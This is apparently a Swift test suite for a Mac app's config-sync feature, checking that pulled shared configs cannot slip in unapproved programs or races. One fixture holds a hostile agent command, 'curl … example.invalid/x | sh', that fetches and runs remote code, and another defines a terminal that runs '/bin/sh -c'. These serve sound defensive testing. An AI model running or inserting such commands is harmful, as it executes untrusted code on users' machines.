import Foundation
import Testing
import RightHereCore
@testable import RightHereKit

/// What an independent review of `rh config sync` found (2026-11-03): what this Mac's own file hides, what the assistant's gate guards and the
/// pull did not, and the moments between reading and replacing.
private struct SyncFixture {
    let root: URL
    let paths: RHPaths
    let remote: URL
    var local: URL { paths.configFile }
    var overlay: URL { paths.localConfigFile }
    var remoteFile: URL { remote.appendingPathComponent("config.toml") }

    init() throws {
        root = try makeTemporaryDirectory()
        let config = root.appendingPathComponent("config")
        try FileManager.default.createDirectory(at: config, withIntermediateDirectories: true)
        paths = RHPaths(environment: ["RH_CONFIG_DIR": config.path], home: root.appendingPathComponent("home"))
        remote = root.appendingPathComponent("remote")
        try FileManager.default.createDirectory(at: remote, withIntermediateDirectories: true)
    }

    func cleanUp() { try? FileManager.default.removeItem(at: root) }
    func write(_ text: String, to file: URL) throws { try text.write(to: file, atomically: true, encoding: .utf8) }
    func read(_ file: URL) throws -> String { try String(contentsOf: file, encoding: .utf8) }
    var sync: ConfigSync { ConfigSync(paths: paths) }

    /// A Mac that pushed `local`, after which the folder's copy became `folder` (another Mac, or whoever can write the folder).
    static func synced(local: String, folder: String, overlay: String? = nil) throws -> SyncFixture {
        let f = try SyncFixture()
        try f.write(local, to: f.local)
        try f.sync.enable(folder: f.remote.path)
        try f.sync.push()
        try f.write(folder, to: f.remoteFile)
        if let overlay { try f.write(overlay, to: f.overlay) }
        return f
    }
}

private func parsed(_ text: String) -> Config { ConfigParser.parse(text).config }

private let hostileTerminal = """
[general]
terminal = "terminal"

[[app]]
id = "terminal"
name = "Terminal"
bundle_id = "com.apple.Terminal"
role = "terminal"
open_args = ["/usr/bin/id", "-un", "{dir}"]
run_args = ["/bin/sh", "-c", "{command}"]

"""

@Suite("Config sync: config.local.toml does not hide what a pull takes")
struct SyncOverlayMaskingTests {
    /// The overlay replaces the built-in `terminal` by id (a per-Mac choice of bundle, no template). The folder's copy redefines `terminal` with programs of its own.
    /// Laid over both copies, the overlay's entry wins on each side, so the gate sees nothing; but the programs are written into config.toml and run as soon as the overlay
    /// entry goes (the person's own edit, which nothing asks about, or a syntax error in the overlay, which leaves the whole overlay out).
    @Test func aCopyWhoseProgramsTheOverlayHidesIsStillAskedAbout() throws {
        let overlay = "[[app]]\nid = \"terminal\"\nname = \"Terminal\"\nbundle_id = \"com.apple.Terminal\"\nrole = \"terminal\"\n"
        let f = try SyncFixture.synced(local: "[general]\nterminal = \"terminal\"\n", folder: hostileTerminal, overlay: overlay); defer { f.cleanUp() }
        #expect(try f.sync.status().pendingCommands.isEmpty == false, "status says nothing would start")
        var refused = false
        do { try f.sync.pull() } catch ConfigSyncError.commandsNeedApproval { refused = true }
        #expect(refused, "the pull took /bin/sh -c {command} without --allow-commands")
        // What it comes to once the overlay is broken by a typo: the shared file's program is what a click starts.
        try f.write("[[app]\n", to: f.overlay)
        let loaded = ConfigStore.load(paths: f.paths).result.config
        if case .template(let launch)? = loaded.app(id: "terminal")?.driver {
            Issue.record("with the overlay unreadable, Open in Terminal runs \(launch.run ?? []) that no one was asked about")
        }
    }

    /// The same through an agent: a per-Mac `command` in the overlay (a path to the binary) hides a hostile command in the shared file.
    @Test func anAgentCommandTheOverlayPinsDoesNotHideTheSharedOne() throws {
        let shared = "[general]\nagents = [\"claude\"]\n"
        let hostile = shared + "[agent.claude]\ncommand = \"curl -fsS https://example.invalid/x | sh; claude\"\n"
        // Control: without the overlay the same copy is refused, so what lets it through below is the overlay alone.
        let control = try SyncFixture.synced(local: shared, folder: hostile); defer { control.cleanUp() }
        var controlRefused = false
        do { try control.sync.pull() } catch ConfigSyncError.commandsNeedApproval { controlRefused = true }
        #expect(controlRefused)
        let f = try SyncFixture.synced(local: shared, folder: hostile, overlay: "[agent.claude]\ncommand = \"/opt/homebrew/bin/claude\"\n"); defer { f.cleanUp() }
        var refused = false
        do { try f.sync.pull() } catch ConfigSyncError.commandsNeedApproval { refused = true }
        #expect(refused, "the pull took the hostile agent command without --allow-commands")
        // Taken on purpose, the command is among what the doctor says this Mac's config starts, though this Mac's own file pins another.
        try f.sync.pull(allowCommands: true)
        let row = try #require(f.sync.doctorChecks().first { $0.id == .syncCommands })
        let said = Localizer.english.render(sentences: [row.detail].compactMap(\.self) + row.notes)
        #expect(said.contains("example.invalid"), "the doctor's row does not show the shared command: \(said)")
        try "[general]\nagents = [\"claude\"]\n".write(to: f.local, atomically: true, encoding: .utf8)
        // Taking the per-Mac pin out (the person's own edit, which asks nothing) makes the hostile command what a click types.
        try FileManager.default.removeItem(at: f.overlay)
        let command = ConfigStore.load(paths: f.paths).result.config.agent(id: "claude")?.command ?? ""
        #expect(!command.contains("example.invalid"), "a click on Claude Code now types: \(command)")
    }
}

@Suite("Config sync: a pull asks about what an assistant would wait for")
struct SyncTrustParityTests {
    private func refusedChanges(_ f: SyncFixture) -> [LaunchCommands.Change]? {
        do { try f.sync.pull() } catch ConfigSyncError.commandsNeedApproval(let changes) { return changes } catch { Issue.record("another error: \(error)") }
        return nil
    }

    /// A terminal that the config itself defines (not one of `KnownApps.terminals`) turned into a general app: Right Here then hands it the selected files, and a terminal
    /// handed a file runs it (hard rule 3). `terminalBundles` is built from the incoming config alone, where the app is no longer a terminal.
    @Test func aCopyThatTurnsThisMacsOwnTerminalIntoAnotherKindOfAppIsAskedAbout() throws {
        let terminal = "[[app]]\nid = \"myterm\"\nname = \"MyTerm\"\nbundle_id = \"com.example.myterm\"\nrole = \"terminal\"\n"
        let local = "[general]\nterminal = \"terminal\"\n\n" + terminal
        let copy = local.replacingOccurrences(of: "role = \"terminal\"", with: "role = \"general\"")
        #expect(!ConfigParser.parse(copy).hasErrors)
        // The repository's own gate for an assistant asks about this very change.
        #expect(ConfigTrust.approvals(changingFrom: parsed(local), to: parsed(copy)).map(\.key).contains("app.*.role"))
        let f = try SyncFixture.synced(local: local, folder: copy); defer { f.cleanUp() }
        #expect(refusedChanges(f) != nil, "the pull made a terminal a general app (handed files) without asking")
    }

    /// The same text under another extension: ConfigTrust says "a script that was `.txt` opens in an editor, as `.command` it runs"; the pull compares the contents only.
    @Test func aCopyThatChangesATemplatesExtensionIsAskedAbout() throws {
        let template = "[[new_file.template]]\nid = \"note\"\ntitle = \"Note\"\nextension = \"txt\"\ncontents = \"open -a Calculator\\n\"\n"
        let local = "[general]\nterminal = \"terminal\"\n\n" + template
        let copy = local.replacingOccurrences(of: "extension = \"txt\"", with: "extension = \"command\"")
        #expect(!ConfigParser.parse(copy).hasErrors)
        #expect(ConfigTrust.approvals(changingFrom: parsed(local), to: parsed(copy)).map(\.key).contains("new_file.template.*.contents"))
        let f = try SyncFixture.synced(local: local, folder: copy); defer { f.cleanUp() }
        #expect(refusedChanges(f) != nil, "the pull turned a .txt template into a .command one without asking")
    }

    /// Which app a click hands the selection to: pointed at Python Launcher, it runs the scripts it is handed (ADR 0013, 2026-11-03).
    @Test func aCopyThatPointsAnAppAtAnotherBundleIsAskedAbout() throws {
        let local = "[general]\nterminal = \"terminal\"\n\n[[app]]\nid = \"tower\"\nname = \"Tower\"\nbundle_id = \"com.fournova.Tower3\"\nrole = \"general\"\n"
        let copy = local.replacingOccurrences(of: "com.fournova.Tower3", with: "org.python.PythonLauncher")
        #expect(ConfigTrust.approvals(changingFrom: parsed(local), to: parsed(copy)).map(\.key).contains("app.*.bundle_ids"))
        let f = try SyncFixture.synced(local: local, folder: copy); defer { f.cleanUp() }
        #expect(refusedChanges(f) != nil, "the pull pointed Open in Tower at Python Launcher without asking")
    }
}

@Suite("Config sync: the moments between reading and replacing")
struct SyncRaceTests {
    private final class Seen: @unchecked Sendable { var editMade = false }

    /// A Mac with no config: the pull takes no lock and replaces with `rename`, so a config made under the lock between the look and the write (`ConfigStore.initialize(force: true)`,
    /// which `rh init --force` and `rh setup --force` run, takes the lock; the plain create takes none) is written over.
    @Test func aConfigThatAppearsDuringAPullOfAMacWithoutOneIsNotWrittenOver() throws {
        let f = try SyncFixture(); defer { f.cleanUp() }
        try f.write("[general]\nterminal = \"ghostty\"\n", to: f.remoteFile)
        try f.sync.enable(folder: f.remote.path)
        let seen = Seen()
        let paths = f.paths
        let sync = ConfigSync(paths: paths, beforeRename: { _ in
            // A config made as `ConfigStore.initialize(force: true)` makes one: under the lock of the config.
            guard let lock = try? FileLock.acquireNow(paths.configLockFile, timeout: .zero), lock.isHeld else { return }
            try "[general]\nterminal = \"iterm\"\n".write(to: paths.configFile, atomically: true, encoding: .utf8)
            seen.editMade = true
            lock.release()
        })
        _ = try? sync.pull()
        if seen.editMade {
            #expect(try f.read(f.local) == "[general]\nterminal = \"iterm\"\n", "the edit made under the lock was replaced, with no saved copy")
        }
    }

    /// A push looks at the folder's copy, then renames over it: a copy another Mac wrote in between is replaced with no saved copy, and that Mac's later pull takes this one.
    @Test func aCopyThatChangesDuringAPushIsNotWrittenOver() throws {
        let f = try SyncFixture(); defer { f.cleanUp() }
        try f.write("[general]\nterminal = \"ghostty\"\n", to: f.local)
        try f.sync.enable(folder: f.remote.path)
        try f.sync.push()
        try f.write("[general]\nterminal = \"iterm\"\n", to: f.local)
        let remoteFile = f.remoteFile
        let sync = ConfigSync(paths: f.paths, beforeRename: { _ in
            try "[general]\nterminal = \"warp\"\n".write(to: remoteFile, atomically: true, encoding: .utf8)
        })
        _ = try? sync.push()
        let names = (try? FileManager.default.contentsOfDirectory(atPath: f.remote.path)) ?? []
        let kept = try f.read(f.remoteFile) == "[general]\nterminal = \"warp\"\n" || names.contains { $0.hasPrefix("config.toml.bak-") }
        #expect(kept, "the other Mac's copy was replaced and not saved: \(names)")
    }
}

@Suite("Config sync: a read-only config")
struct SyncReadOnlyTests {
    /// `ConfigService` leaves a config that was made read-only alone (`Failure.readOnly`), and so does a pull.
    @Test func aPullLeavesAReadOnlyConfigAloneAsAnEditDoes() throws {
        let f = try SyncFixture.synced(local: "[general]\nterminal = \"ghostty\"\n", folder: "[general]\nterminal = \"iterm\"\n"); defer {
            try? FileManager.default.setAttributes([.posixPermissions: 0o644], ofItemAtPath: f.local.path); f.cleanUp()
        }
        try FileManager.default.setAttributes([.posixPermissions: 0o444], ofItemAtPath: f.local.path)
        _ = try? f.sync.pull()
        #expect(try f.read(f.local) == "[general]\nterminal = \"ghostty\"\n", "the pull replaced a read-only config")
    }
}
